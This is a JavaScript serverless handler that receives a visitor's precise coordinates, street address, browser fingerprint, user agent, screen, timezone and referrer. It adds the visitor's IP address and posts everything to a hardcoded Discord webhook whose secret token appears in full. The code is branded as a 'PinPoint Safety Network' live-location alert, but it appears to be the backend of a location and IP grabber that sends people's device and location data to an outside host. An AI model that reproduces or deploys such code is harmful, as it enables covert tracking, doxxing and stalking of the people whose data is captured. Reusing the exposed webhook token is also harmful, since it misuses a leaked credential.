const WEBHOOK = "https://discord.com/api/webhooks/1561109893388312717/89sLNo-mTKF2OnTWpGGwWJf4_CrdtnCiRbwd7Xm__Io2mCi8X-ZPaOCQih12_w-SEWug";

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({ ok: false });

  const d = req.body || {};
  const ip =
    (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
    req.headers["x-real-ip"] ||
    "unknown";

  const embed = {
    title: "🚨 PINPOINT ALERT — Live Location",
    color: 0xff3b5c,
    description: "**Danger signal triggered.** Location + device data captured.",
    fields: [
      { name: "📍 Coords", value: d.lat && d.lon ? `${d.lat}, ${d.lon}` : "unavailable", inline: true },
      { name: "🎯 Accuracy", value: d.accuracy ? `${Math.round(d.accuracy)} m` : "n/a", inline: true },
      { name: "🌐 IP", value: ip, inline: true },
      { name: "🏠 Address", value: d.address || "unresolved", inline: false },
      { name: "🖥 Browser", value: d.ua || "unknown", inline: false },
      { name: "🧬 Fingerprint", value: `\`${d.fingerprint || "n/a"}\``, inline: false },
      { name: "📐 Screen", value: d.screen || "n/a", inline: true },
      { name: "🕒 Timezone", value: d.timezone || "n/a", inline: true },
      { name: "🔗 Referrer", value: d.referrer || "direct", inline: false }
    ],
    timestamp: new Date().toISOString(),
    footer: { text: "PinPoint Safety Network" }
  };

  try {
    const r = await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });
    return res.status(200).json({ ok: r.ok, ip });
  } catch (e) {
    return res.status(500).json({ ok: false, error: e.message });
  }
}
